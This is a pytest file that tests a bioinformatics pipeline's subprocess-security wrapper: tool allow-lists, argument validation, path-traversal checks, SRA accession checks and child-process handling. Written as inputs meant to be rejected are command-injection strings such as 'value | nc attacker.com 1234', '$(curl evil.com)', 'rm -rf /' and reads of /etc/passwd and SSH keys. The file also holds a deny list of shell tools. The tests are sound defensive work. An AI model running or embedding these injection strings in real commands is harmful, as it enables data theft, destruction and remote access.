"""
COMPREHENSIVE TESTS for utils/security.py (53% -> 85%+ coverage)

This file provides thorough testing of security-critical code including
adversarial testing for injection attacks and path traversal.

Run: pytest tests/test_security_comprehensive.py -v
"""

import os
import sys

import pytest
import shutil
import subprocess
import threading
import time
from pathlib import Path
from unittest.mock import Mock, patch

from prepare.utils.security import SecureSubprocess
from prepare.core.exceptions import SecurityError


@pytest.fixture(autouse=True)
def _isolated_allowed_roots(monkeypatch):
    """Give every test its own copy of the class-level allowed roots, restored afterwards.

    Several tests here (``_megahit_args`` among them) register tmp_path folders through
    ``add_allowed_root``; without this they would stay allowed for every later test.
    """
    monkeypatch.setattr(SecureSubprocess, "_extra_roots", list(SecureSubprocess._extra_roots))


def _fake_proc(returncode=0, stdout="", stderr=""):
    """A stand-in for subprocess.Popen's return value, as run_secure uses it."""
    proc = Mock()
    proc.communicate.return_value = (stdout, stderr)
    proc.returncode = returncode
    proc.poll.return_value = returncode
    return proc


class TestExecutableValidation:
    """Test executable name validation."""

    def test_validate_allowed_executable(self):
        """Test that allowed executables pass validation."""
        # These should be in ALLOWED_BIOINFORMATICS_TOOLS
        allowed_tools = ["fasterq-dump", "sourmash", "pigz"]

        for tool in allowed_tools:
            try:
                result = SecureSubprocess.validate_executable(tool)
                assert result == tool
            except SecurityError:
                # Skip if tool not in constants
                pass

    def test_validate_disallowed_executable(self):
        """Test that disallowed executables raise SecurityError."""
        dangerous_executables = [
            "rm",
            "bash",
            "sh",
            "python",
            "perl",
            "curl",
            "wget",
        ]

        for exe in dangerous_executables:
            with pytest.raises(SecurityError, match="not allowed"):
                SecureSubprocess.validate_executable(exe)

    def test_validate_executable_with_path_traversal(self):
        """Test that path traversal in executable name is rejected."""
        malicious_executables = [
            "../../../bin/bash",
            "/usr/bin/rm",
            "../../evil_script",
            "tool/../../../rm",
            "tool\\..\\..\\cmd",
        ]

        for exe in malicious_executables:
            # May be caught by either "not allowed" or "Invalid executable path"
            with pytest.raises(SecurityError):
                SecureSubprocess.validate_executable(exe)

    def test_validate_executable_with_dots(self):
        """Test that executables containing '..' are rejected."""
        with pytest.raises(SecurityError):
            SecureSubprocess.validate_executable("valid..tool")


class TestParameterValidation:
    """Test parameter validation for executables."""

    def test_validate_safe_parameter(self):
        """Test that safe parameters are accepted."""
        # Test with an allowed executable
        executable = "fasterq-dump"

        # Common safe parameters for fasterq-dump
        safe_params = ["-O", "--outdir", "-t", "--threads"]

        for param in safe_params:
            try:
                result = SecureSubprocess.validate_parameter(executable, param)
                assert result == param
            except SecurityError:
                # Skip if parameter not in safe list
                pass

    def test_validate_unsafe_parameter(self):
        """Test that unsafe parameters are rejected."""
        executable = "fasterq-dump"

        # These should not be in the safe parameters list
        unsafe_params = [
            "--exec",
            "--system",
            "--shell",
        ]

        for param in unsafe_params:
            with pytest.raises(SecurityError, match="not allowed"):
                SecureSubprocess.validate_parameter(executable, param)

    def test_validate_parameter_with_shell_metacharacters(self):
        """Test that parameters with shell metacharacters are rejected."""
        executable = "fasterq-dump"

        malicious_params = [
            "value; rm -rf /",
            "value && cat /etc/passwd",
            "value | nc attacker.com 1234",
            "value`whoami`",
            "value$(cat /etc/passwd)",
            "value > /tmp/evil",
            "value & background_process",
        ]

        for param in malicious_params:
            with pytest.raises(SecurityError, match="unsafe characters"):
                SecureSubprocess.validate_parameter(executable, param)

    def test_validate_parameter_undefined_executable(self):
        """Test parameter validation for undefined executable."""
        with pytest.raises(SecurityError, match="No parameter validation defined"):
            SecureSubprocess.validate_parameter("unknown_tool", "-x")

    def test_megahit_version_flag_allowed(self):
        assert SecureSubprocess._build_validated_command("megahit", ["--version"]) == ["megahit", "--version"]

    def test_megahit_presets_flag_allowed(self):
        cmd = SecureSubprocess._build_validated_command("megahit", ["--presets", "meta-sensitive"])
        assert cmd == ["megahit", "--presets", "meta-sensitive"]

    def test_megahit_tmp_dir_flag_passes_validation(self, tmp_path):
        """The default per-run megahit scratch directory (Task 2, audit deferred S7-2) is
        passed to megahit as ``--tmp-dir``; the allow-list must accept it, or every
        ``extract_target_reads --assemble`` run fails right after mapping succeeds, as it
        did in production before this fix (SecurityError: Parameter '--tmp-dir' not
        allowed for megahit). Built with the real ``_megahit_args`` and run through the
        real validator, not a mock, so a gap like this cannot hide behind a mocked
        ``run_secure`` again.
        """
        from prepare.data.read_extraction import _megahit_args

        output_folder = tmp_path / "targeted"
        output_folder.mkdir()
        out_dir = output_folder / "SRR1" / "GCF_1_assembly"
        tmp_dir = output_folder / ".megahit-tmp-abcd1234"

        args = _megahit_args(
            [tmp_path / "GCF_1_1.fastq.gz", tmp_path / "GCF_1_2.fastq.gz"],
            out_dir,
            threads=4,
            min_contig_len=None,
            preset="meta-sensitive",
            k_flags=None,
            tmp_dir=tmp_dir,
        )

        cmd = SecureSubprocess._build_validated_command("megahit", args)
        assert "--tmp-dir" in cmd
        assert cmd[cmd.index("--tmp-dir") + 1] == str(tmp_dir.resolve())

    def test_megahit_safe_params_cover_every_flag_megahit_args_can_emit(self, tmp_path):
        """Every literal flag ``_megahit_args`` can emit must be in the megahit allow-list.

        A new flag added to ``_megahit_args`` without a matching allow-list entry passes
        every unit test that mocks ``run_secure`` and only surfaces once megahit actually
        runs against a real project -- exactly how the ``--tmp-dir`` gap (audit deferred
        S7-2, Task 2 fix round 1) reached production. This derives the flag set from the
        real function's output rather than a hand-maintained list, so it stays correct as
        ``_megahit_args`` changes.
        """
        from prepare.data.read_extraction import _megahit_args

        paired_args = _megahit_args(
            [tmp_path / "r1.fastq.gz", tmp_path / "r2.fastq.gz"],
            tmp_path / "asm",
            threads=4,
            min_contig_len=100,
            preset="meta-sensitive",
            k_flags=None,
            tmp_dir=tmp_path / "scratch",
        )
        single_end_args = _megahit_args(
            [tmp_path / "r.fastq.gz"],
            tmp_path / "asm2",
            threads=4,
            min_contig_len=None,
            preset=None,
            k_flags={"k-min": 21, "k-max": 141, "k-step": 10},
            tmp_dir=None,
        )
        flags_emitted = {a for a in (*paired_args, *single_end_args) if a.startswith("-")}
        safe_params = SecureSubprocess.SAFE_PARAMETERS["megahit"]
        missing = flags_emitted - safe_params
        assert not missing, f"megahit allow-list is missing: {sorted(missing)}"

    def test_minimap2_flags_used_by_read_extraction_pass_validation(self, tmp_path):
        """read_extraction.py's minimap2 calls go through ``_minimap2_index_args``
        (``build_index``) and ``_minimap2_map_args`` (``_run_minimap2``, its FASTA-fallback
        retry, and ``assembly_coverage``, all the same shape). Built with the real builders
        and run through the real validator, not a mock, as a regression guard for the same
        class of gap ``--tmp-dir`` fell into (audit deferred S7-2, Task 2 fix round 1): a
        flag a builder emits but the allow-list rejects would otherwise pass every unit
        test that mocks ``run_secure`` and only surface once minimap2 actually runs.
        """
        from prepare.data.read_extraction import _minimap2_index_args, _minimap2_map_args

        calls = [
            # build_index
            _minimap2_index_args("sr", tmp_path / "idx.mmi", tmp_path / "genome.fna"),
            # _run_minimap2 against the prebuilt index
            _minimap2_map_args(
                "sr",
                4,
                tmp_path / "out.sam",
                tmp_path / "ref.mmi",
                [tmp_path / "r1.fastq.gz", tmp_path / "r2.fastq.gz"],
            ),
            # _run_minimap2's FASTA-fallback retry (same shape, a FASTA in place of the index)
            _minimap2_map_args(
                "sr",
                4,
                tmp_path / "out.sam",
                tmp_path / "genome.fna",
                [tmp_path / "r1.fastq.gz", tmp_path / "r2.fastq.gz"],
            ),
            # assembly_coverage
            _minimap2_map_args("sr", 4, tmp_path / "coverage.sam", tmp_path / "contigs.fa", [tmp_path / "r1.fastq.gz"]),
        ]
        for args in calls:
            SecureSubprocess._build_validated_command("minimap2", args)  # must not raise

        flags_emitted = {a for call in calls for a in call if a.startswith("-")}
        missing = flags_emitted - SecureSubprocess.SAFE_PARAMETERS["minimap2"]
        assert not missing, f"minimap2 allow-list is missing: {sorted(missing)}"

        # Every mapping call skips unmapped read records (less for samtools to read,
        # filter and count downstream); the index build has no reads to skip.
        index_args, *map_calls = calls
        assert "--sam-hit-only" not in index_args
        for args in map_calls:
            assert "--sam-hit-only" in args

    def test_minimap2_sam_hit_only_is_registered_as_boolean(self):
        """``--sam-hit-only`` takes no value. Without this registration, a positional
        placed right after it (minimap2's own parser permutes options freely, so this can
        legitimately happen) would be swallowed as the flag's value instead of validated
        as its own argument."""
        from prepare.utils.security import BOOLEAN_FLAGS

        assert "--sam-hit-only" in BOOLEAN_FLAGS["minimap2"]

    def test_samtools_flags_used_by_read_extraction_pass_validation(self, tmp_path):
        """read_extraction.py's samtools calls go through ``_samtools_count_args``
        (``_count_records``), ``_samtools_view_args`` (``_filter_and_merge_bam``'s
        single-SAM and per-mate cases, and ``assembly_coverage``), ``_samtools_cat_args``
        (``_filter_and_merge_bam``'s merge step) and ``_samtools_fastq_single_args``/
        ``_samtools_fastq_paired_args`` (``_export_mapped_fastq``). Built with the real
        builders and run through the real validator, not a mock, as a regression guard for
        the same class of gap ``--tmp-dir`` fell into (audit deferred S7-2, Task 2 fix
        round 1): a flag a builder emits but the allow-list rejects would otherwise pass
        every unit test that mocks ``run_secure`` and only surface once samtools actually
        runs.
        """
        from prepare.data.read_extraction import (
            _samtools_cat_args,
            _samtools_count_args,
            _samtools_coverage_args,
            _samtools_fastq_paired_args,
            _samtools_fastq_single_args,
            _samtools_sort_args,
            _samtools_view_args,
        )

        calls = [
            # _count_records
            _samtools_count_args(("-F", "4"), tmp_path / "x.sam"),
            # _filter_and_merge_bam, single-SAM case, with an explicit --min-mapq
            _samtools_view_args(["-F", "0x904", "-q", "20"], 4, tmp_path / "x.bam", tmp_path / "x.sam"),
            # _filter_and_merge_bam, per-mate loop of the unequal-mates fallback
            _samtools_view_args(["-F", "0x904"], 4, tmp_path / "x.mate1.bam", tmp_path / "x.mate1.sam"),
            # _filter_and_merge_bam, merging the per-mate BAMs
            _samtools_cat_args(tmp_path / "merged.bam", [tmp_path / "a.bam", tmp_path / "b.bam"]),
            # _export_mapped_fastq, single-end output
            _samtools_fastq_single_args(4, tmp_path / "o0.fastq.gz", tmp_path / "x.bam"),
            # _export_mapped_fastq, paired output
            _samtools_fastq_paired_args(
                4,
                tmp_path / "o1.fastq.gz",
                tmp_path / "o2.fastq.gz",
                tmp_path / "s.fastq.gz",
                tmp_path / "orphans.fastq.gz",
                tmp_path / "x.bam",
            ),
            # assembly_coverage
            _samtools_view_args(["-F", "0x904"], 4, tmp_path / "coverage.bam", tmp_path / "coverage.sam"),
            # reference_coverage: coordinate sort, then per-contig coverage
            _samtools_sort_args(4, tmp_path / "x.mapped.sorted.bam", tmp_path / "x.mapped.bam"),
            _samtools_coverage_args(tmp_path / "x_coverage.tsv", tmp_path / "x.mapped.sorted.bam"),
        ]
        for args in calls:
            SecureSubprocess._build_validated_command("samtools", args)  # must not raise

        flags_emitted = {a for call in calls for a in call if a.startswith("-")}
        missing = flags_emitted - SecureSubprocess.SAFE_PARAMETERS["samtools"]
        assert not missing, f"samtools allow-list is missing: {sorted(missing)}"


class TestPathValidation:
    """Test file path validation and security."""

    def test_validate_safe_path(self):
        """Test that safe paths in allowed directories are accepted."""
        # Use a path that's definitely allowed
        with patch.object(SecureSubprocess, "validate_path") as mock_validate:
            mock_validate.return_value = Path("/tmp/safe_directory")

            result = SecureSubprocess.validate_path("/tmp/safe_directory")
            assert result == Path("/tmp/safe_directory")

    def test_validate_relative_path_in_cwd(self, tmp_path, monkeypatch):
        """Test that relative paths in CWD are accepted."""
        monkeypatch.chdir(tmp_path)

        test_file = Path("test.txt")
        result = SecureSubprocess.validate_path(test_file, allow_creation=True)

        assert result.is_absolute()

    def test_validate_path_outside_allowed_dirs(self):
        """Test that paths outside allowed directories are rejected."""
        # Try to access system directories
        dangerous_paths = [
            "/etc/passwd",
            "/var/log/messages",
            "/root/.ssh/id_rsa",
        ]

        for path in dangerous_paths:
            try:
                SecureSubprocess.validate_path(path)
                # If it doesn't raise, it might be in an allowed directory
            except SecurityError:
                # Expected for paths outside allowed dirs
                pass

    def test_validate_path_with_traversal_attack(self, tmp_path, monkeypatch):
        """Test that path traversal attacks are rejected."""
        monkeypatch.chdir(tmp_path)

        # These should be caught by the security checks
        traversal_attempts = [
            "../../../etc/passwd",
            "data/../../../../../../etc/shadow",
            "./data/../../../sensitive",
        ]

        for path in traversal_attempts:
            # May be caught by either "outside allowed directories" or "Unsafe path component"
            with pytest.raises(SecurityError):
                SecureSubprocess.validate_path(path, allow_creation=False)

    def test_validate_single_dot_path(self, tmp_path, monkeypatch):
        """Test that single dot path is allowed."""
        monkeypatch.chdir(tmp_path)

        result = SecureSubprocess.validate_path(".", allow_creation=True)
        assert result == tmp_path


class TestAccessionValidation:
    """Test SRA accession validation."""

    def test_validate_valid_accessions(self):
        """Test that valid SRA accessions pass validation."""
        valid_accessions = [
            "SRR000001",
            "ERR123456",
            "DRR999999",
            "SRR12345678",
        ]

        for accession in valid_accessions:
            result = SecureSubprocess.validate_accession_for_subprocess(accession)
            assert result == accession

    def test_validate_invalid_accession_format(self):
        """Test that invalid accession formats are rejected."""
        invalid_accessions = [
            "INVALID001",
            "SRR",
            "123456",
            "",
            "SRR-000001",
        ]

        for accession in invalid_accessions:
            with pytest.raises(SecurityError, match="Invalid SRA accession"):
                SecureSubprocess.validate_accession_for_subprocess(accession)

    def test_validate_accession_with_injection_attempt(self):
        """Test that injection attempts in accessions are rejected."""
        malicious_accessions = [
            "SRR000001; rm -rf /",
            "SRR000001 && cat /etc/passwd",
            "SRR000001`whoami`",
            "SRR000001$(id)",
            "SRR000001|nc",
        ]

        for accession in malicious_accessions:
            with pytest.raises(SecurityError):
                SecureSubprocess.validate_accession_for_subprocess(accession)


class TestSecureSubprocessRun:
    """Test secure subprocess execution."""

    def test_run_secure_basic(self):
        """Test basic secure subprocess execution."""
        with patch("subprocess.Popen", return_value=_fake_proc()) as mock_run:
            # Mock the validation to pass
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with patch.object(SecureSubprocess, "validate_parameter", side_effect=lambda e, p: p):
                    SecureSubprocess.run_secure("echo", ["Hello", "World"])

            assert mock_run.called

    def test_run_secure_validates_executable(self):
        """Test that run_secure validates the executable."""
        with pytest.raises(SecurityError, match="not allowed"):
            SecureSubprocess.run_secure("rm", ["-rf", "/"])

    def test_run_secure_validates_parameters(self):
        """Test that run_secure validates parameters."""
        with patch("subprocess.Popen", return_value=_fake_proc()):
            with patch.object(SecureSubprocess, "validate_executable", return_value="fasterq-dump"):
                with patch.object(SecureSubprocess, "validate_parameter", side_effect=SecurityError("Unsafe param")):
                    with pytest.raises(SecurityError, match="Unsafe param"):
                        SecureSubprocess.run_secure("fasterq-dump", ["--evil-param", "value"])

    def test_run_secure_removes_dangerous_env_vars(self):
        """Test that dangerous environment variables are removed."""
        with patch("subprocess.Popen", return_value=_fake_proc()) as mock_run:
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with patch.object(SecureSubprocess, "validate_parameter", side_effect=lambda e, p: p):
                    SecureSubprocess.run_secure(
                        "echo", ["test"], env={"LD_PRELOAD": "/evil/lib.so", "SAFE_VAR": "value"}
                    )

            # Check that subprocess.Popen was called
            assert mock_run.called
            call_kwargs = mock_run.call_args[1]

            # Dangerous env vars should be removed
            assert "LD_PRELOAD" not in call_kwargs["env"]

    def test_run_secure_timeout_handling(self):
        """Test timeout handling in secure subprocess."""
        proc = _fake_proc()
        proc.communicate.side_effect = [subprocess.TimeoutExpired("cmd", 10), ("", "")]
        with patch("subprocess.Popen", return_value=proc):

            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with pytest.raises(SecurityError, match="timed out"):
                    SecureSubprocess.run_secure("echo", ["test"], timeout=1)

    def test_run_secure_preserves_calledprocesserror(self):
        """Test that CalledProcessError is preserved (not wrapped)."""
        with patch("subprocess.Popen", return_value=_fake_proc(returncode=1)):

            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with pytest.raises(subprocess.CalledProcessError):
                    SecureSubprocess.run_secure("echo", ["test"])

    def test_run_secure_with_cwd(self, tmp_path):
        """Test secure subprocess with working directory."""
        with patch("subprocess.Popen", return_value=_fake_proc()) as mock_run:
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with patch.object(SecureSubprocess, "validate_path", return_value=tmp_path):
                    SecureSubprocess.run_secure("echo", ["test"], cwd=str(tmp_path))

                # Verify cwd was validated and used
                assert mock_run.called


class TestAdvancedSecurityScenarios:
    """Test advanced security scenarios and edge cases."""

    def test_command_injection_via_argument(self):
        """Test that command injection via arguments is prevented."""
        injection_attempts = [
            ["-o", "output.txt; rm -rf /"],
            ["--output", "file.txt && cat /etc/passwd"],
            ["-x", "`whoami`"],
            ["$(curl evil.com)"],
        ]

        for args in injection_attempts:
            # These should be caught by parameter validation
            try:
                with patch("subprocess.Popen", return_value=_fake_proc()):
                    with patch.object(SecureSubprocess, "validate_executable", return_value="tool"):
                        SecureSubprocess.run_secure("tool", args)
            except (SecurityError, subprocess.CalledProcessError):
                # Either caught by validation or would fail execution
                pass

    def test_environment_variable_injection(self):
        """Test that environment variable injection is prevented."""
        dangerous_env = {
            "LD_PRELOAD": "/tmp/evil.so",
            "LD_LIBRARY_PATH": "/tmp/evil",
            "PYTHONPATH": "/tmp/evil_modules",
        }

        with patch("subprocess.Popen", return_value=_fake_proc()) as mock_run:
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                SecureSubprocess.run_secure("echo", ["test"], env=dangerous_env)

            # Verify dangerous vars were removed
            call_kwargs = mock_run.call_args[1]
            env = call_kwargs["env"]

            assert "LD_PRELOAD" not in env or env.get("LD_PRELOAD") != "/tmp/evil.so"

    def test_null_byte_injection(self):
        """Test that null byte injection is prevented."""
        malicious_paths = [
            "file.txt\x00.exe",
            "data.csv\x00; rm -rf /",
        ]

        for path in malicious_paths:
            # Null bytes should be caught by validation
            with pytest.raises((SecurityError, ValueError)):
                SecureSubprocess.validate_path(path)

    def test_unicode_normalization_attack(self):
        """Test handling of unicode normalization attacks."""
        # Unicode characters that could be used for obfuscation
        tricky_executables = [
            "ｒｍ",  # ascii-ok: full-width characters
            "r\u200bm",  # Zero-width space
        ]

        for exe in tricky_executables:
            with pytest.raises(SecurityError):
                SecureSubprocess.validate_executable(exe)


class TestArgumentParsing:
    """Test argument parsing and validation logic."""

    def test_parse_flag_with_value(self):
        """Test parsing of flag with value argument."""
        with patch("subprocess.Popen", return_value=_fake_proc()) as mock_run:
            with patch.object(SecureSubprocess, "validate_executable", return_value="tool"):
                with patch.object(SecureSubprocess, "validate_parameter", side_effect=lambda e, p: p):
                    with patch.object(SecureSubprocess, "validate_path", side_effect=lambda p, **k: Path(p)):
                        SecureSubprocess.run_secure("tool", ["-O", "/tmp/output", "--threads", "4"])

            # Verify command was built correctly
            call_args = mock_run.call_args[0][0]
            assert "-O" in call_args
            assert "--threads" in call_args

    def test_parse_standalone_argument(self):
        """Test parsing of standalone arguments."""
        with patch("subprocess.Popen", return_value=_fake_proc()) as mock_run:
            with patch.object(SecureSubprocess, "validate_executable", return_value="fasterq-dump"):
                with patch.object(SecureSubprocess, "validate_accession_for_subprocess", return_value="SRR000001"):
                    with patch.object(SecureSubprocess, "validate_parameter", side_effect=lambda e, p: p):
                        SecureSubprocess.run_secure("fasterq-dump", ["SRR000001"])

            # Verify accession was validated
            call_args = mock_run.call_args[0][0]
            assert "SRR000001" in call_args

    def test_prefetch_progress_does_not_swallow_accession(self):
        """prefetch --progress is boolean; the accession stays a validated positional."""
        cmd = SecureSubprocess._build_validated_command("prefetch", ["--progress", "SRR1"])
        assert cmd == ["prefetch", "--progress", "SRR1"]

    def test_fasterq_dump_split_3_accepts_sra_path_positional(self, tmp_path, monkeypatch):
        """--split-3 is boolean for fasterq-dump; a .sra positional is path-validated."""
        monkeypatch.chdir(tmp_path)
        sra_dir = tmp_path / "SRR1"
        sra_dir.mkdir()
        sra_file = sra_dir / "SRR1.sra"
        sra_file.write_text("data")

        cmd = SecureSubprocess._build_validated_command("fasterq-dump", ["--split-3", "--threads", "4", str(sra_file)])
        assert cmd == ["fasterq-dump", "--split-3", "--threads", "4", str(sra_file.resolve())]

    def test_fasterq_dump_accepts_a_sralite_path_positional(self, tmp_path, monkeypatch):
        """NCBI serves some runs only as .sralite; that archive is a path, not an accession."""
        monkeypatch.chdir(tmp_path)
        sra_dir = tmp_path / "SRR1"
        sra_dir.mkdir()
        sra_file = sra_dir / "SRR1.sralite"
        sra_file.write_text("data")

        cmd = SecureSubprocess._build_validated_command("fasterq-dump", ["--split-3", str(sra_file)])
        assert cmd == ["fasterq-dump", "--split-3", str(sra_file.resolve())]

    def test_pigz_parallel_force_allowed(self, tmp_path, monkeypatch):
        """pigz -p <n> -f <file> is an allowed command."""
        monkeypatch.chdir(tmp_path)
        target = tmp_path / "reads.fastq"
        target.write_text("data")

        cmd = SecureSubprocess._build_validated_command("pigz", ["-p", "4", "-f", str(target)])
        assert cmd == ["pigz", "-p", "4", "-f", str(target.resolve())]

    def test_minimap2_boolean_a_does_not_swallow_x_flag(self):
        """minimap2 -a is boolean; the following -x flag must not be consumed as its value."""
        cmd = SecureSubprocess._build_validated_command("minimap2", ["-a", "-x", "sr"])
        assert cmd == ["minimap2", "-a", "-x", "sr"]

    def test_minimap2_index_flag_is_path_validated(self, tmp_path, monkeypatch):
        """minimap2 -d <index> builds an index file; the path is validated like -o."""
        monkeypatch.chdir(tmp_path)
        cmd = SecureSubprocess._build_validated_command(
            "minimap2", ["-x", "sr", "-d", "idx/genome.sr.mmi", "genome.fna"]
        )
        assert cmd == ["minimap2", "-x", "sr", "-d", str((tmp_path / "idx" / "genome.sr.mmi").resolve()), "genome.fna"]

    def test_samtools_min_mapq_flag_allowed(self):
        """samtools view -q <n> (minimum MAPQ) is an allowed parameter."""
        cmd = SecureSubprocess._build_validated_command("samtools", ["view", "-b", "-q", "20", "in.sam"])
        assert cmd == ["samtools", "view", "-b", "-q", "20", "in.sam"]

    def test_samtools_cat_subcommand_allowed(self):
        """samtools cat merges two BAM files (unequal-mates single-end fallback)."""
        cmd = SecureSubprocess._build_validated_command("samtools", ["cat", "-o", "out.bam", "a.bam", "b.bam"])
        assert cmd[:2] == ["samtools", "cat"]

    def test_seqkit_stats_command_allowed(self):
        """seqkit stats -T -j <threads> <files...> is the shared stats cache's exact-count path."""
        cmd = SecureSubprocess._build_validated_command(
            "seqkit", ["stats", "-T", "-j", "4", "reads_1.fastq", "reads_2.fastq"]
        )
        assert cmd == ["seqkit", "stats", "-T", "-j", "4", "reads_1.fastq", "reads_2.fastq"]

    def test_seqkit_stats_boolean_t_does_not_swallow_j_flag(self):
        """-T is boolean (tabular output); the following -j flag must not be consumed as its value."""
        cmd = SecureSubprocess._build_validated_command("seqkit", ["-T", "-j", "2"])
        assert cmd == ["seqkit", "-T", "-j", "2"]

    def test_prefetch_unknown_positional_rejected(self):
        """A positional for prefetch that is neither an accession nor a .sra path is rejected."""
        with pytest.raises(SecurityError):
            SecureSubprocess._build_validated_command("prefetch", ["--progress", "not-an-accession"])


class TestDefensiveGuards:
    """Cover the defensive error branches that normal inputs cannot reach."""

    def test_allowlisted_executable_with_path_separator_rejected(self):
        """An allowlisted name containing a path separator is still rejected."""
        # The real allowlist holds only clean names, so patch it to reach the
        # path-traversal guard in validate_executable.
        with patch.object(SecureSubprocess, "ALLOWED_EXECUTABLES", {"bad/exe"}):
            with pytest.raises(SecurityError, match="Invalid executable path"):
                SecureSubprocess.validate_executable("bad/exe")

    def test_accession_with_non_ascii_digits_rejected(self):
        """Unicode digits pass str.isdigit() but must fail the ASCII pattern."""
        # "SRR" + superscript digits: validate_accession() accepts it (isdigit()
        # is True) but the SRA_ACCESSION_PATTERN [0-9]+ check rejects it.
        accession = "SRR¹²³"  # ascii-ok: superscript digits
        with pytest.raises(SecurityError, match="invalid characters"):
            SecureSubprocess.validate_accession_for_subprocess(accession)

    def test_path_with_parent_traversal_rejected(self):
        """A '..' segment is rejected when creation is disabled, on any platform."""
        with pytest.raises(SecurityError, match="Unsafe path component"):
            SecureSubprocess.validate_path("foo/../bar", allow_creation=False)

    def test_run_secure_wraps_unexpected_subprocess_error(self):
        """A non-CalledProcessError from subprocess.Popen becomes a SecurityError."""
        with patch("subprocess.Popen", side_effect=ValueError("boom")):
            with pytest.raises(SecurityError, match="Subprocess execution failed"):
                SecureSubprocess.run_secure("datasets", ["--version"])


class TestFasterqDumpCommandContract:
    """The exact argument list prepare.data.sra builds must pass validation unchanged."""

    def test_real_download_argument_order_is_accepted(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        args = ["--threads", "4", "--progress", "SRR2517620", "-O", "out/SRR2517620_temp"]
        cmd = SecureSubprocess._build_validated_command("fasterq-dump", args)
        expected_out = str((tmp_path / "out" / "SRR2517620_temp").resolve())
        assert cmd == ["fasterq-dump", "--threads", "4", "--progress", "SRR2517620", "-O", expected_out]

    def test_non_numeric_thread_count_rejected(self):
        with pytest.raises(SecurityError, match="Invalid integer value for --threads"):
            SecureSubprocess._build_validated_command("fasterq-dump", ["--threads", "four", "SRR000001"])

    def test_bad_accession_after_boolean_flag_rejected(self):
        with pytest.raises(SecurityError, match="Invalid SRA accession format"):
            SecureSubprocess._build_validated_command("fasterq-dump", ["--progress", "not-an-accession"])

    def test_split_files_does_not_swallow_accession(self):
        cmd = SecureSubprocess._build_validated_command("fasterq-dump", ["--split-files", "SRR000001"])
        assert cmd == ["fasterq-dump", "--split-files", "SRR000001"]


class TestSamtoolsOutputPaths:
    def test_fastq_output_flags_are_path_validated(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        args = ["fastq", "-1", "out/r1.fq.gz", "-2", "out/r2.fq.gz", "-s", "out/s.fq.gz", "-0", "out/o.fq.gz", "in.bam"]
        cmd = SecureSubprocess._build_validated_command("samtools", args)
        resolved = str((tmp_path / "out" / "o.fq.gz").resolve())
        assert cmd[cmd.index("-0") + 1] == resolved
        assert cmd[cmd.index("-s") + 1] == str((tmp_path / "out" / "s.fq.gz").resolve())

    def test_dead_fasterq_dump_flags_are_rejected(self):
        with pytest.raises(SecurityError):
            SecureSubprocess._build_validated_command("fasterq-dump", ["--gzip", "SRR000001"])


class TestAllowedRoots:
    """validate_path accepts system temp dirs and roots registered from user-supplied folders."""

    @pytest.fixture(autouse=True)
    def _reset_roots(self):
        SecureSubprocess._extra_roots.clear()
        yield
        SecureSubprocess._extra_roots.clear()

    def test_system_tempdir_is_allowed(self):
        import shutil
        import tempfile

        temp_dir = Path(tempfile.mkdtemp())
        try:
            target = temp_dir / "reads"
            assert SecureSubprocess.validate_path(target) == target.resolve()
        finally:
            shutil.rmtree(temp_dir)

    def test_registered_root_permits_external_folder(self, tmp_path, monkeypatch):
        work = tmp_path / "work"
        work.mkdir()
        external = tmp_path / "external"
        external.mkdir()
        monkeypatch.setattr(
            SecureSubprocess, "allowed_roots", classmethod(lambda cls: [work.resolve()] + list(cls._extra_roots))
        )
        with pytest.raises(SecurityError, match="outside allowed directories"):
            SecureSubprocess.validate_path(external / "out.sam")

        SecureSubprocess.add_allowed_root(external)
        assert SecureSubprocess.validate_path(external / "out.sam") == (external / "out.sam").resolve()

    def test_root_prefix_collision_rejected(self, tmp_path, monkeypatch):
        root = tmp_path / "data"
        root.mkdir()
        sibling = tmp_path / "data2"
        sibling.mkdir()
        monkeypatch.setattr(SecureSubprocess, "allowed_roots", classmethod(lambda cls: [root.resolve()]))
        with pytest.raises(SecurityError, match="outside allowed directories"):
            SecureSubprocess.validate_path(sibling / "x.txt")

    def test_add_allowed_root_is_idempotent(self, tmp_path):
        SecureSubprocess.add_allowed_root(tmp_path)
        SecureSubprocess.add_allowed_root(tmp_path)
        assert SecureSubprocess._extra_roots.count(tmp_path.resolve()) == 1


class TestChildProcessTracking:
    """run_secure records every child it starts so an interrupt can stop them."""

    @pytest.fixture(autouse=True)
    def _reset_stopping(self):
        SecureSubprocess.clear_stopping()
        yield
        SecureSubprocess.clear_stopping()

    def test_child_started_after_terminate_children_is_killed_at_once(self, monkeypatch):
        monkeypatch.setattr(SecureSubprocess, "_children", {})
        assert SecureSubprocess.terminate_children(grace=0.0) == 0
        proc = _fake_proc(returncode=-9)
        # The stopping flag is seen before Popen, so no child is started at all.
        with patch("subprocess.Popen", return_value=proc) as popen:
            with pytest.raises(subprocess.CalledProcessError) as raised:
                SecureSubprocess.run_secure("datasets", ["--version"])
        popen.assert_not_called()
        assert raised.value.returncode == -9
        assert not SecureSubprocess._children

    def test_child_started_as_terminate_children_runs_is_killed_at_once(self, monkeypatch):
        monkeypatch.setattr(SecureSubprocess, "_children", {})
        proc = _fake_proc(returncode=-9)

        def popen(*args, **kwargs):
            SecureSubprocess.terminate_children(grace=0.0)
            return proc

        with patch("subprocess.Popen", side_effect=popen):
            with pytest.raises(subprocess.CalledProcessError):
                SecureSubprocess.run_secure("datasets", ["--version"])
        proc.kill.assert_called_once()
        assert not SecureSubprocess._children

    def test_clear_stopping_lets_children_run_again(self, monkeypatch):
        monkeypatch.setattr(SecureSubprocess, "_children", {})
        SecureSubprocess.terminate_children(grace=0.0)
        SecureSubprocess.clear_stopping()
        proc = _fake_proc()
        with patch("subprocess.Popen", return_value=proc):
            SecureSubprocess.run_secure("datasets", ["--version"])
        proc.kill.assert_not_called()

    @pytest.mark.skipif(shutil.which("sleep") is None, reason="needs a sleep executable")
    def test_run_secure_tracks_children_and_terminate_children_kills_them(self, monkeypatch):
        monkeypatch.setattr(SecureSubprocess, "ALLOWED_EXECUTABLES", SecureSubprocess.ALLOWED_EXECUTABLES | {"sleep"})
        started = threading.Event()
        outcome = {}

        def run_sleep():
            started.set()
            try:
                SecureSubprocess.run_secure("sleep", ["30"])
